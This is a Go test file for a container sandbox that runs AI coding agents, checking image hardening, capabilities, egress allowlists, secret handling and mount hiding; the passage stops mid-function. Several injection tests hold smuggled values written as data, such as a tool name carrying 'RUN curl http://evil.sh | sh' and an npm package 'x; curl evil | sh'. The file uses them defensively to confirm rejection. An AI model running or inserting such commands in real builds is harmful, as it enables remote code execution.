package container

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/FolksyPizza/rig/internal/config"
	"github.com/FolksyPizza/rig/internal/provider"
)

func TestMain(m *testing.M) {
	// Keep the user's custom agent definitions out of the tests.
	os.Setenv("RIG_AGENTS_DIR", "/nonexistent")
	os.Exit(m.Run())
}

func testProfile() *config.Profile {
	return &config.Profile{
		Version:     1,
		Name:        "demo",
		Security:    config.SecurityConfig{Level: config.LevelStandard},
		Agents:      []config.AgentConfig{{ID: "claude-code"}},
		Tools:       []string{"ripgrep", "neovim"},
		Network:     config.NetworkConfig{Mode: "allowlist"},
		Commands:    config.CommandsConfig{Mode: "unrestricted"},
		Resources:   config.ResourcesConfig{CPU: 2, Memory: 4096, PIDLimit: 512},
		Storage:     config.StorageConfig{Size: "10g"},
		Persistence: "persistent",
	}
}

func mustContext(t *testing.T, p *config.Profile) *BuildContext {
	t.Helper()
	bc, err := GenerateContext(p)
	if err != nil {
		t.Fatal(err)
	}
	return bc
}

// ── Image build context ──────────────────────────────────────────────

func TestDockerfileHasNoSudoByDefault(t *testing.T) {
	df := mustContext(t, testProfile()).Dockerfile
	if strings.Contains(df, "sudo") || strings.Contains(df, "NOPASSWD") {
		t.Errorf("generated image installs or configures sudo:\n%s", df)
	}
	if !strings.Contains(df, "USER sandbox") {
		t.Error("image must drop to the sandbox user")
	}
	if !strings.Contains(df, "useradd -m -s /bin/bash -u 1000 sandbox") {
		t.Error("expected an unprivileged sandbox user with uid 1000 and no supplementary groups")
	}
	if !strings.Contains(df, `ENTRYPOINT ["/usr/local/bin/rig-entrypoint"]`) {
		t.Error("expected Rig's entrypoint")
	}
}

func TestDockerfileSudoWhenEnabled(t *testing.T) {
	p := testProfile()
	p.Security.Sudo = true
	df := mustContext(t, p).Dockerfile
	if !strings.Contains(df, "NOPASSWD:ALL") || !strings.Contains(df, "visudo -cf") {
		t.Errorf("sudo requested but not configured:\n%s", df)
	}
	if !strings.Contains(df, "env_keep") {
		t.Error("sudo must keep the proxy variables, or package installs cannot reach the network")
	}

	p.Security.Level = config.LevelStrict // strict never gets sudo
	if df := mustContext(t, p).Dockerfile; strings.Contains(df, "NOPASSWD") {
		t.Error("strict level must not configure sudo")
	}
}

func TestDockerfileIncludesToolsAndAgents(t *testing.T) {
	df := mustContext(t, testProfile()).Dockerfile
	for _, want := range []string{"ripgrep", "neovim", "@anthropic-ai/claude-code", "FROM ubuntu:24.04", "FROM node:22-bookworm-slim AS node", "COPY --from=node /usr/local/bin/node"} {
		if !strings.Contains(df, want) {
			t.Errorf("Dockerfile missing %q", want)
		}
	}
	// No install script is fetched and run as root.
	if strings.Contains(df, "nodesource") || strings.Contains(df, "| bash") || strings.Contains(df, "bash /tmp/") {
		t.Error("the image build must not run downloaded install scripts")
	}

	t.Setenv("RIG_NODE_IMAGE", "registry.example/node:22@sha256:"+strings.Repeat("a", 64))
	if df := mustContext(t, testProfile()).Dockerfile; !strings.Contains(df, "FROM registry.example/node:22@sha256:") {
		t.Error("RIG_NODE_IMAGE should replace the Node image")
	}
	t.Setenv("RIG_NODE_IMAGE", "node:22\nRUN evil")
	if _, err := GenerateContext(testProfile()); err == nil {
		t.Error("an invalid RIG_NODE_IMAGE must be refused")
	}
}

func TestDockerfileIsDeterministic(t *testing.T) {
	p := testProfile()
	p.Packages = config.PackagesConfig{NPM: []string{"typescript", "eslint"}, Pip: []string{"requests", "httpx"}}
	first := mustContext(t, p)
	for i := 0; i < 20; i++ {
		got := mustContext(t, p)
		if got.Dockerfile != first.Dockerfile || got.Hash != first.Hash {
			t.Fatal("build context is not deterministic; this would bust the build cache on every run")
		}
	}
}

func TestBuildHashTracksProfileChanges(t *testing.T) {
	p := testProfile()
	a := mustContext(t, p)
	p.Tools = append(p.Tools, "tmux")
	b := mustContext(t, p)
	if a.Hash == b.Hash {
		t.Error("changing tools must change the build hash, or the image would not be rebuilt")
	}
	if !strings.Contains(b.Dockerfile, `rig.build-hash="`+b.Hash+`"`) {
		t.Error("the image must carry its build hash as a label")
	}
	if strings.TrimSpace(string(b.Files["rig/version"])) != b.Hash {
		t.Error("rig/version must hold the build hash")
	}
}

func TestDockerfileRejectsInjection(t *testing.T) {
	p := testProfile()
	p.Tools = []string{"ripgrep\nRUN curl http://evil.sh | sh"}
	if _, err := GenerateContext(p); err == nil {
		t.Fatal("expected an error for a tool name containing a newline")
	}
	p = testProfile()
	p.Name = "../escape"
	if _, err := GenerateContext(p); err == nil {
		t.Fatal("expected an error for an invalid profile name")
	}
	p = testProfile()
	p.Agents = []config.AgentConfig{{ID: "nope"}}
	if _, err := GenerateContext(p); err == nil {
		t.Fatal("expected an error for an unknown agent")
	}
	p = testProfile()
	p.Packages.NPM = []string{"x; curl evil | sh"}
	if _, err := GenerateContext(p); err == nil {
		t.Fatal("expected an error for an injected npm package")
	}
	p = testProfile()
	p.Agents = []config.AgentConfig{{ID: "claude-code", Version: "1.0'; id; '"}}
	if _, err := GenerateContext(p); err == nil {
		t.Fatal("expected an error for an injected agent version")
	}
}

func TestDockerfileAvoidsHeredoc(t *testing.T) {
	if df := mustContext(t, testProfile()).Dockerfile; strings.Contains(df, "<<") {
		t.Errorf("Dockerfile uses a heredoc, which requires BuildKit:\n%s", df)
	}
}

func TestPackagesAreQuoted(t *testing.T) {
	p := testProfile()
	p.Packages = config.PackagesConfig{NPM: []string{"@scope/tool@1.2.3"}, Pip: []string{"httpx[http2]>=0.27"}}
	df := mustContext(t, p).Dockerfile
	if !strings.Contains(df, "npm install -g --no-fund --no-audit --loglevel=error '@scope/tool@1.2.3'") {
		t.Errorf("npm packages not installed/quoted:\n%s", df)
	}
	if !strings.Contains(df, "'httpx[http2]>=0.27'") {
		t.Errorf("pip package with a comparison must be quoted:\n%s", df)
	}
	if !strings.Contains(df, "python3-pip") {
		t.Error("pip packages need python3-pip")
	}
}

func TestHelperStageOnlyWhenNeeded(t *testing.T) {
	if bc := mustContext(t, testProfile()); strings.Contains(bc.Dockerfile, "AS rig-helper") {
		t.Error("a profile without MCP or a gateway should not build rig-helper into its image")
	}
	p := testProfile()
	p.MCP.Servers = []config.MCPServer{{Name: "fs", Command: []string{"mcp-fs"}}}
	bc := mustContext(t, p)
	if !strings.Contains(bc.Dockerfile, "FROM golang:1.26-alpine AS rig-helper") || !strings.Contains(bc.Dockerfile, "COPY --from=rig-helper") {
		t.Errorf("in-sandbox MCP servers need rig-helper:\n%s", bc.Dockerfile)
	}
	if bc.Files["rig-helper-src/cmd/rig-helper/main.go"] == nil || bc.Files["rig-helper-src/go.mod"] == nil {
		t.Error("helper source missing from the build context")
	}
	for path := range bc.Files {
		if strings.HasSuffix(path, "_test.go") {
			t.Errorf("test file %s should not be in the build context", path)
		}
	}
}

func TestContextHoldsNoHostFiles(t *testing.T) {
	p := testProfile()
	p.Mounts = []config.MountConfig{{Source: "/srv/code", Target: "/code"}}
	bc := mustContext(t, p)
	for path := range bc.Files {
		if !strings.HasPrefix(path, "rig/") && !strings.HasPrefix(path, "rig-helper-src/") {
			t.Errorf("unexpected file in build context: %s", path)
		}
	}
	if strings.Contains(bc.Dockerfile, "/srv/code") {
		t.Error("mounts are runtime-only and must not appear in the image")
	}
}

func TestImageOverrideValidation(t *testing.T) {
	t.Setenv("RIG_BASE_IMAGE", "mirror.gcr.io/library/ubuntu:24.04")
	if df := mustContext(t, testProfile()).Dockerfile; !strings.Contains(df, "FROM mirror.gcr.io/library/ubuntu:24.04") {
		t.Error("RIG_BASE_IMAGE not applied")
	}
	t.Setenv("RIG_BASE_IMAGE", "ubuntu:24.04\nRUN evil")
	if _, err := GenerateContext(testProfile()); err == nil {
		t.Error("an injected base image must be rejected")
	}
}

// ── MCP and harness configuration ───────────────────────────────────

func TestMCPConfigForAgents(t *testing.T) {
	p := testProfile()
	p.Agents = []config.AgentConfig{{ID: "claude-code"}, {ID: "codex"}, {ID: "gemini-cli"}, {ID: "opencode"}}
	p.MCP.Servers = []config.MCPServer{
		{Name: "fs", Command: []string{"mcp-fs", "--root", "/work"}, DenyTools: []string{"delete_*"}, Env: map[string]string{"MODE": "ro", "TOKEN": "${FS_TOKEN}"}},
		{Name: "blender", Command: []string{"blender-mcp"}, HostPorts: []int{9876}},
		{Name: "docs", URL: "https://mcp.docs.example/mcp", Headers: map[string]string{"Authorization": "Bearer ${DOCS_TOKEN}"}},
	}
	bc := mustContext(t, p)

	var claude struct {
		MCPServers map[string]map[string]any `json:"mcpServers"`
	}
	if err := json.Unmarshal(bc.Files["rig/claude-mcp.json"], &claude); err != nil {
		t.Fatalf("claude config: %v", err)
	}
	fs := claude.MCPServers["fs"]
	if fs["command"] != "rig-helper" {
		t.Errorf("in-sandbox servers must run through the guard: %+v", fs)
	}
	args, _ := json.Marshal(fs["args"])
	if !strings.Contains(string(args), `"mcp-guard"`) || !strings.Contains(string(args), `"--","mcp-fs","--root","/work"`) {
		t.Errorf("guard args wrong: %s", args)
	}
	if claude.MCPServers["blender"]["url"] != "http://rig-gw:8800/mcp/blender" {
		t.Errorf("gateway servers are reached over HTTP: %+v", claude.MCPServers["blender"])
	}
	if claude.MCPServers["docs"]["url"] != "https://mcp.docs.example/mcp" {
		t.Errorf("remote server wrong: %+v", claude.MCPServers["docs"])
	}

	var policy struct {
		Deny []string          `json:"deny"`
		Env  map[string]string `json:"env"`
	}
	if err := json.Unmarshal(bc.Files["rig/mcp/fs.json"], &policy); err != nil {
		t.Fatal(err)
	}
	if len(policy.Deny) != 1 || policy.Env["MODE"] != "ro" {
		t.Errorf("guard policy wrong: %+v", policy)
	}
	if _, leaked := policy.Env["TOKEN"]; leaked {
		t.Error("secret references must not be written into the image")
	}

	toml := string(bc.Files["rig/home/.codex/config.toml"])
	for _, want := range []string{"[mcp_servers.fs]", `command = "rig-helper"`, "[mcp_servers.blender]", `url = "http://rig-gw:8800/mcp/blender"`, `bearer_token_env_var = "DOCS_TOKEN"`} {
		if !strings.Contains(toml, want) {
			t.Errorf("codex config missing %q:\n%s", want, toml)
		}
	}
	if gem := string(bc.Files["rig/home/.gemini/settings.json"]); !strings.Contains(gem, `"httpUrl": "http://rig-gw:8800/mcp/blender"`) {
		t.Errorf("gemini config wrong:\n%s", gem)
	}
	if oc := string(bc.Files["rig/home/.config/opencode/opencode.json"]); !strings.Contains(oc, `"Bearer {env:DOCS_TOKEN}"`) || !strings.Contains(oc, `"autoupdate": false`) {
		t.Errorf("opencode config wrong:\n%s", oc)
	}
	for _, s := range []string{"TOKEN", "DOCS_TOKEN"} {
		for path, data := range bc.Files {
			if strings.Contains(string(data), "secret-value-"+s) {
				t.Errorf("%s leaked into %s", s, path)
			}
		}
	}
}

// Every file under /etc/rig that an agent's MCP config or the Dockerfile
// points at must be in the image. COPY rig/ /etc/rig/ maps the build-context
// file rig/<path> to /etc/rig/<path>.
func TestReferencedRigFilesAreInTheImage(t *testing.T) {
	withMCP := testProfile()
	withMCP.Agents = []config.AgentConfig{{ID: "claude-code"}, {ID: "codex"}, {ID: "gemini-cli"}}
	withMCP.MCP.Servers = []config.MCPServer{{Name: "fs", Command: []string{"mcp-fs"}, DenyTools: []string{"rm"}}}

	locked := testProfile()
	locked.Agents = []config.AgentConfig{{ID: "claude-code"}, {ID: "gemini-cli"}}
	locked.Security.Level = config.LevelLockdown
	locked.Persistence = "ephemeral"

	ref := regexp.MustCompile(`/etc/rig/[A-Za-z0-9_.-]+(/[A-Za-z0-9_.-]+)*\.json`)
	for _, p := range []*config.Profile{withMCP, locked} {
		bc := mustContext(t, p)
		if !strings.Contains(bc.Dockerfile, "COPY rig/ /etc/rig/") {
			t.Fatal("the build context's rig/ folder must be copied to /etc/rig/")
		}
		var all strings.Builder
		all.WriteString(bc.Dockerfile)
		for name, b := range bc.Files {
			if strings.HasPrefix(name, "rig/") { // not the helper's Go source
				all.Write(b)
			}
		}
		found := ref.FindAllString(all.String(), -1)
		if len(found) == 0 {
			t.Fatalf("%s: expected references to files under /etc/rig", p.Security.Level)
		}
		for _, path := range found {
			if _, ok := bc.Files["rig/"+strings.TrimPrefix(path, "/etc/rig/")]; !ok {
				t.Errorf("%s: %s is referenced but not in the image", p.Security.Level, path)
			}
		}
	}
}

func TestHarnessPoliciesAtLockdown(t *testing.T) {
	p := testProfile()
	p.Agents = []config.AgentConfig{{ID: "claude-code"}, {ID: "gemini-cli"}}
	p.Security.Level = config.LevelLockdown
	p.Persistence = "ephemeral"
	bc := mustContext(t, p)
	settings := string(bc.Files["rig/policy/claude-managed-settings.json"])
	if !strings.Contains(settings, "WebSearch") || !strings.Contains(settings, `"disableBypassPermissionsMode": "disable"`) {
		t.Errorf("claude managed settings wrong:\n%s", settings)
	}
	if !strings.Contains(bc.Dockerfile, "/etc/claude-code/managed-settings.json") || !strings.Contains(bc.Dockerfile, "/etc/gemini-cli/settings.json") {
		t.Error("lockdown policies must be installed under /etc")
	}

	p.Security.Level = config.LevelStandard
	p.Persistence = "persistent"
	if bc := mustContext(t, p); bc.Files["rig/policy/claude-managed-settings.json"] != nil {
		t.Error("harness policies are a lockdown feature")
	}
}

func TestTOMLString(t *testing.T) {
	cases := map[string]string{
		`plain`:      `"plain"`,
		`a"b`:        `"a\"b"`,
		`back\slash`: `"back\\slash"`,
		"tab\there":  `"tab\u0009here"`,
		"nl\nx":      `"nl\u000Ax"`,
	}
	for in, want := range cases {
		if got := tomlString(in); got != want {
			t.Errorf("tomlString(%q) = %s, want %s", in, got, want)
		}
	}
}

// ── Create arguments ────────────────────────────────────────────────

func argsContainPair(args []string, flag, value string) bool {
	for i := 0; i < len(args)-1; i++ {
		if args[i] == flag && args[i+1] == value {
			return true
		}
	}
	return false
}

func argsContain(args []string, value string) bool {
	for _, a := range args {
		if a == value {
			return true
		}
	}
	return false
}

func argsHavePrefix(args []string, prefix string) bool {
	for _, a := range args {
		if strings.HasPrefix(a, prefix) {
			return true
		}
	}
	return false
}

func spec(p *config.Profile) LaunchSpec {
	return LaunchSpec{Profile: p, Effective: p.Resolve(), Isolation: Isolation{Level: config.IsolationContainer}}
}

func TestBuildCreateArgsHardening(t *testing.T) {
	r := &Runner{}
	args := r.buildCreateArgs(spec(testProfile()), createOpts{name: "rig-demo"})

	for _, pair := range [][2]string{
		{"--security-opt", "no-new-privileges"},
		{"--cap-drop", "ALL"},
		{"--cgroupns", "private"},
		{"--ipc", "private"},
		{"--hostname", "sandbox"},
		{"--label", LabelProfile + "=demo"},
		{"--label", LabelRole + "=" + RoleSandbox},
		{"--label", "rig.level=standard"},
	} {
		if !argsContainPair(args, pair[0], pair[1]) {
			t.Errorf("missing %s %s", pair[0], pair[1])
		}
	}
	for _, flag := range []string{"--pids-limit=512", "--memory=4096m", "--memory-swap=4096m", "--cpus=2.00", "--init"} {
		if !argsContain(args, flag) {
			t.Errorf("missing %s", flag)
		}
	}
	if argsContain(args, "--cap-add") {
		t.Error("no capabilities should be added without sudo")
	}
	if argsContain(args, "--read-only") {
		t.Error("standard level keeps a writable image layer")
	}
}

func TestBuildCreateArgsSudo(t *testing.T) {
	p := testProfile()
	p.Security.Sudo = true
	args := (&Runner{}).buildCreateArgs(spec(p), createOpts{name: "rig-demo"})
	if argsContainPair(args, "--security-opt", "no-new-privileges") {
		t.Error("sudo cannot work with no-new-privileges")
	}
	if !argsContainPair(args, "--cap-add", "SETUID") || argsContainPair(args, "--cap-add", "NET_RAW") || argsContainPair(args, "--cap-add", "SYS_ADMIN") {
		t.Errorf("sudo should add only the minimal capability set: %v", args)
	}
	if !argsContainPair(args, "--cap-drop", "ALL") {
		t.Error("caps must still be dropped first")
	}
}

func TestBuildCreateArgsStrictFilesystem(t *testing.T) {
	p := testProfile()
	p.Security.Level = config.LevelStrict
	args := (&Runner{}).buildCreateArgs(spec(p), createOpts{name: "rig-demo"})
	if !argsContain(args, "--read-only") {
		t.Error("strict level must mount the image read-only")
	}
	if !argsContainPair(args, "--tmpfs", "/tmp:rw,nosuid,nodev,noexec,size=1g,mode=1777") {
		t.Error("strict level needs a noexec /tmp")
	}
	if !argsContainPair(args, "-v", "rig-demo-home:/home/sandbox") {
		t.Error("a persistent read-only sandbox keeps home in a named volume")
	}

	p.Persistence = "ephemeral"
	args = (&Runner{}).buildCreateArgs(spec(p), createOpts{name: "rig-demo", ephemeral: true})
	if !argsContainPair(args, "-v", "/home/sandbox") {
		t.Error("an ephemeral read-only sandbox gets an anonymous home volume")
	}
}

func TestBuildCreateArgsLockdownHome(t *testing.T) {
	p := testProfile()
	p.Security.Level = config.LevelLockdown
	p.Persistence = "ephemeral"
	args := (&Runner{}).buildCreateArgs(spec(p), createOpts{name: "rig-demo", ephemeral: true})
	if !argsHavePrefix(args, "/home/sandbox:rw,nosuid,nodev,noexec") {
		t.Errorf("lockdown home must be noexec: %v", args)
	}
	if !argsContainPair(args, "-v", "/home/sandbox/workspace") {
		t.Error("lockdown needs a writable workspace when home is noexec")
	}
}

func TestBuildCreateArgsIsolationRuntime(t *testing.T) {
	p := testProfile()
	s := spec(p)
	s.Isolation = Isolation{Level: config.IsolationGVisor, Runtime: "runsc"}
	s.Network = &NetworkSetup{Network: "rig-net-demo", ProxyIP: "172.30.0.2"}
	args := (&Runner{}).buildCreateArgs(s, createOpts{name: "rig-demo"})
	if !argsContainPair(args, "--runtime", "runsc") {
		t.Error("gVisor runtime not requested")
	}
	if !argsContainPair(args, "--add-host", ProxyAlias+":172.30.0.2") {
		t.Error("gVisor sandboxes should reach the proxy by address")
	}
	s.Gateway, s.GatewayIP = true, "172.30.0.3"
	if args := (&Runner{}).buildCreateArgs(s, createOpts{name: "rig-demo"}); !argsContainPair(args, "--add-host", GatewayHost+":172.30.0.3") {
		t.Error("gVisor sandboxes should reach the gateway by address")
	}
	if !argsContainPair(args, "--label", "rig.isolation=gvisor") {
		t.Error("isolation should be recorded on the container")
	}
}

func TestBuildCreateArgsNetworkModes(t *testing.T) {
	r := &Runner{}
	p := testProfile()
	s := spec(p)
	s.Network = &NetworkSetup{Network: "rig-net-demo"}
	args := r.buildCreateArgs(s, createOpts{name: "rig-demo"})
	if !argsContainPair(args, "--network", "rig-net-demo") {
		t.Error("allowlist mode must attach the internal network")
	}
	if argsContain(args, "--add-host") {
		t.Error("plain containers resolve the proxy through the engine's DNS")
	}

	p = testProfile()
	p.Network = config.NetworkConfig{Mode: "none"}
	if args := r.buildCreateArgs(spec(p), createOpts{name: "rig-demo"}); !argsContainPair(args, "--network", "none") {
		t.Error("none mode must use --network none")
	}

	p = testProfile()
	p.Security.Level = config.LevelOpen
	p.Network = config.NetworkConfig{Mode: "unrestricted"}
	if args := r.buildCreateArgs(spec(p), createOpts{name: "rig-demo"}); argsContain(args, "--network") {
		t.Error("unrestricted mode should not pass --network")
	}
}

func TestBuildCreateArgsPersistence(t *testing.T) {
	r := &Runner{}
	args := r.buildCreateArgs(spec(testProfile()), createOpts{name: "rig-demo"})
	if args[len(args)-2] != "sleep" || args[len(args)-1] != "infinity" {
		t.Errorf("persistent sandbox should run a long-lived init, got %v", args[len(args)-3:])
	}
	if argsContain(args, "--rm") {
		t.Error("persistent sandbox must not use --rm")
	}

	p := testProfile()
	p.Persistence = "ephemeral"
	args = r.buildCreateArgs(spec(p), createOpts{name: "rig-demo", ephemeral: true})
	if !argsContain(args, "--rm") || args[len(args)-1] != p.ImageTag() {
		t.Error("ephemeral sandbox should use --rm and the image's default command")
	}
	args = r.buildCreateArgs(spec(p), createOpts{name: "rig-demo", ephemeral: true, command: []string{"claude", "--help"}})
	if args[len(args)-2] != "claude" || args[len(args)-1] != "--help" {
		t.Errorf("command override not applied: %v", args[len(args)-3:])
	}
}

func TestBuildCreateArgsMountsAndVolumes(t *testing.T) {
	p := testProfile()
	p.Storage.Volumes = []config.VolumeMount{
		{Name: "workspace", Target: "/home/sandbox/workspace"},
		{Name: "ref", Target: "/ref", ReadOnly: true},
	}
	mounts := []MountSpec{{Source: "/home/user/code", Target: "/code", ReadOnly: true}, {Target: "/code/secrets", Tmpfs: true}}
	args := (&Runner{}).buildCreateArgs(spec(p), createOpts{name: "rig-demo", mounts: mounts})
	if !argsContainPair(args, "-v", "rig-demo-workspace:/home/sandbox/workspace") {
		t.Error("missing named volume")
	}
	if !argsContainPair(args, "-v", "rig-demo-ref:/ref:ro") {
		t.Error("missing read-only named volume")
	}
	if !argsContainPair(args, "-v", "/home/user/code:/code:ro") {
		t.Error("missing read-only bind mount")
	}
	if !argsContainPair(args, "--mount", "type=tmpfs,destination=/code/secrets,tmpfs-size=4k,tmpfs-mode=0000") {
		t.Error("missing hidden directory mount")
	}
}

func TestBuildCreateArgsUsesEnvFile(t *testing.T) {
	args := (&Runner{}).buildCreateArgs(spec(testProfile()), createOpts{name: "rig-demo", envFile: "/tmp/x/sandbox.env"})
	if !argsContainPair(args, "--env-file", "/tmp/x/sandbox.env") {
		t.Error("secrets must be passed via --env-file, not on the command line where ps can read them")
	}
}

// ── Runtime environment ─────────────────────────────────────────────

func TestSandboxEnv(t *testing.T) {
	t.Setenv("ANTHROPIC_API_KEY", "sk-test")
	t.Setenv("FS_TOKEN", "fs-secret")
	p := testProfile()
	p.Security.Level = config.LevelStrict
	p.Agents = []config.AgentConfig{{ID: "claude-code", Env: map[string]string{"ANTHROPIC_API_KEY": "${ANTHROPIC_API_KEY}"}}}
	p.Git.Repos = []config.GitRepo{{Repo: "FolksyPizza/rig"}}
	p.MCP.Servers = []config.MCPServer{{Name: "fs", Command: []string{"mcp-fs"}, Env: map[string]string{"TOKEN": "${FS_TOKEN}"}}}
	s := spec(p)
	s.Gateway = true
	env, err := SandboxEnv(s)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]string{
		"ANTHROPIC_API_KEY":  "sk-test",
		"HTTPS_PROXY":        "http://rig-proxy:3128",
		"https_proxy":        "http://rig-proxy:3128",
		"NO_PROXY":           "localhost,127.0.0.1,rig-gw",
		"NODE_USE_ENV_PROXY": "1",
		"CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1",
		"NPM_CONFIG_IGNORE_SCRIPTS":                "true",
		"GIT_CONFIG_COUNT":                         "3",
		"GIT_CONFIG_KEY_0":                         "url.http://rig-gw:8800/git/github.com/.insteadOf",
		"GIT_CONFIG_VALUE_0":                       "https://github.com/",
		"GIT_CONFIG_VALUE_1":                       "git@github.com:",
		"RIG_MCP_0_TOKEN":                          "fs-secret",
		"RIG_LEVEL":                                "strict",
	}
	for k, v := range want {
		if env[k] != v {
			t.Errorf("env[%s] = %q, want %q", k, env[k], v)
		}
	}
	if _, ok := env["PIP_ONLY_BINARY"]; ok {
		t.Error("PIP_ONLY_BINARY is a lockdown setting")
	}
	if _, ok := env["RIG_GIT_TOKEN"]; ok {
		t.Error("the git token belongs to the gateway, never the sandbox")
	}
}

func TestEgressConfig(t *testing.T) {
	p := testProfile()
	p.Git.Repos = []config.GitRepo{{Repo: "FolksyPizza/rig"}}
	eff := p.Resolve()
	cfg := EgressConfig(eff, "tok")
	if !cfg.BlockRisky || !cfg.RequireSNI {
		t.Errorf("standard egress must block risky destinations and check SNI: %+v", cfg)
	}
	for _, d := range cfg.Allow {
		if d == "github.com" {
			t.Error("the broker's host must not be in the sandbox allowlist")
		}
	}
	if len(cfg.Clients) != 1 || cfg.Clients[0].Allow[0] != "github.com" {
		t.Fatalf("gateway client wrong: %+v", cfg.Clients)
	}
	sum := sha256.Sum256([]byte("tok"))
	if cfg.Clients[0].TokenSHA256 != hex.EncodeToString(sum[:]) {
		t.Error("only the token's hash belongs in the proxy config")
	}
}

func TestGatewayConfig(t *testing.T) {
	p := testProfile()
	p.Host.Ports = []config.HostPort{{Name: "ollama", Port: 11434}, {Name: "web", Port: 3000, HostPort: 8080}}
	p.MCP.Servers = []config.MCPServer{
		{Name: "blender", Command: []string{"blender-mcp"}, HostPorts: []int{9876}, DenyTools: []string{"execute_blender_code"}, Env: map[string]string{"KEY": "${BLENDER_KEY}", "MODE": "x"}},
		{Name: "inside", Command: []string{"mcp-fs"}},
	}
	p.Git = config.GitConfig{TokenEnv: "GITHUB_TOKEN", Repos: []config.GitRepo{{Repo: "a/b", Access: "write", Branches: []string{"agent/*"}}}}
	cfg, targets := GatewayConfig(p)
	if err := cfg.Validate(); err != nil {
		t.Fatal(err)
	}
	if len(cfg.Servers) != 1 || cfg.Servers[0].Name != "blender" {
		t.Errorf("only gateway servers belong in the gateway: %+v", cfg.Servers)
	}
	if cfg.Servers[0].Env["KEY"] != "${RIG_MCP_0_KEY}" || cfg.Servers[0].Env["MODE"] != "x" {
		t.Errorf("server env wrong: %+v", cfg.Servers[0].Env)
	}
	if len(cfg.Ports) != 3 {
		t.Fatalf("expected 3 relayed ports, got %+v", cfg.Ports)
	}
	if cfg.Ports[0].Bind != "0.0.0.0" || cfg.Ports[2].Bind != "127.0.0.1" {
		t.Errorf("sandbox ports listen on all interfaces, MCP ports on loopback only: %+v", cfg.Ports)
	}
	if targets[1].port != 8080 || targets[2].port != 9876 {
		t.Errorf("host targets wrong: %+v", targets)
	}
	if cfg.Git == nil || cfg.Git.TokenEnv != "RIG_GIT_TOKEN" || cfg.Git.Repos[0].Access != "write" {
		t.Errorf("git broker config wrong: %+v", cfg.Git)
	}
}

// ── Mount resolution ────────────────────────────────────────────────

func TestResolveMountsProtectAndHide(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	proj := filepath.Join(home, "proj")
	for _, d := range []string{filepath.Join(proj, ".git", "hooks"), filepath.Join(proj, "secrets"), filepath.Join(home, ".ssh")} {
		if err := os.MkdirAll(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(proj, ".env"), []byte("K=V"), 0o600); err != nil {
		t.Fatal(err)
	}

	p := testProfile()
	p.Security.Level = config.LevelStrict
	p.Mounts = []config.MountConfig{{
		Source: proj, Target: "/work",
		Protect: []string{"missing-dir"},
		Hide:    []string{".env", "secrets", "not-there"},
	}}
	mounts, err := ResolveMounts(p, p.Resolve(), home)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]MountSpec{}
	for _, m := range mounts {
		got[m.Target] = m
	}
	if m := got["/work"]; m.ReadOnly || m.Source != proj {
		t.Errorf("main mount wrong: %+v", m)
	}
	if m := got["/work/.git/hooks"]; !m.ReadOnly {
		t.Errorf("strict level must protect .git/hooks: %+v", mounts)
	}
	if _, ok := got["/work/missing-dir"]; ok {
		t.Error("missing paths cannot be protected and must be skipped")
	}
	if m := got["/work/.env"]; m.Source != "/dev/null" || !m.ReadOnly {
		t.Errorf("hidden file should be covered by /dev/null: %+v", m)
	}
	if m := got["/work/secrets"]; !m.Tmpfs {
		t.Errorf("hidden directory should be covered by an empty tmpfs: %+v", m)
	}

	// A protect entry that is a symlink out of the mount is refused.
	if err := os.Symlink(filepath.Join(home, ".ssh"), filepath.Join(proj, "escape")); err != nil {
		t.Fatal(err)
	}
	p.Mounts[0].Protect = []string{"escape"}
	if _, err := ResolveMounts(p, p.Resolve(), home); err == nil {
		t.Error("a protect path linking outside the mount must be refused")
	}
}

// ── Isolation ───────────────────────────────────────────────────────

func TestResolveIsolation(t *testing.T) {
	std := testProfile().Resolve()
	plain := provider.EngineInfo{Name: "docker", Runtimes: []string{"runc"}}
	withGVisor := provider.EngineInfo{Name: "docker", Runtimes: []string{"runc", "runsc"}}
	withKata := provider.EngineInfo{Name: "podman", Runtimes: []string{"crun", "kata"}}

	if iso, err := ResolveIsolation(std, plain); err != nil || iso.Level != config.IsolationContainer || iso.Runtime != "" {
		t.Errorf("auto with nothing installed = %+v, %v", iso, err)
	}
	if iso, _ := ResolveIsolation(std, withGVisor); iso.Runtime != "runsc" || iso.Level != config.IsolationGVisor {
		t.Errorf("auto should pick gVisor: %+v", iso)
	}
	if iso, _ := ResolveIsolation(std, withKata); iso.Runtime != "kata" || iso.Level != config.IsolationVM {
		t.Errorf("auto should fall back to a VM runtime: %+v", iso)
	}

	lock := testProfile()
	lock.Security.Level = config.LevelLockdown
	lock.Persistence = "ephemeral"
	if _, err := ResolveIsolation(lock.Resolve(), plain); err == nil {
		t.Error("lockdown must refuse to run without gVisor or a VM")
	}

	gv := testProfile()
	gv.Security.Isolation = config.IsolationGVisor
	if _, err := ResolveIsolation(gv.Resolve(), withKata); err == nil {
		t.Error("an explicit gvisor request must fail when gVisor is missing")
	}
	vm := testProfile()
	vm.Security.Isolation = config.IsolationVM
	if iso, err := ResolveIsolation(vm.Resolve(), provider.EngineInfo{Name: "apple"}); err != nil || iso.Level != config.IsolationVM {
		t.Errorf("Apple's runtime is a VM per container: %+v %v", iso, err)
	}
}

func TestCheckEngineSupport(t *testing.T) {
	if err := CheckEngineSupport("apple", testProfile().Resolve()); err == nil {
		t.Error("Apple's runtime cannot enforce an allowlist and must refuse")
	}
	open := testProfile()
	open.Security.Level = config.LevelOpen
	open.Network.Mode = "unrestricted"
	if err := CheckEngineSupport("apple", open.Resolve()); err != nil {
		t.Errorf("open level should run on Apple: %v", err)
	}
	if err := CheckEngineSupport("docker", testProfile().Resolve()); err != nil {
		t.Errorf("docker supports everything: %v", err)
	}
}

// ── Helpers ─────────────────────────────────────────────────────────

func TestShellQuote(t *testing.T) {
	cases := map[string]string{
		"plain":       "'plain'",
		"it's":        `'it'\''s'`,
		`a'b'c`:       `'a'\''b'\''c'`,
		"with spaces": "'with spaces'",
	}
	for in, want := range cases {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestStripStorageOpt(t *testing.T) {
	in := []string{"create", "--name", "x", "--storage-opt", "size=10g", "--cap-drop", "ALL", "img"}
	got, dropped := stripStorageOpt(in)
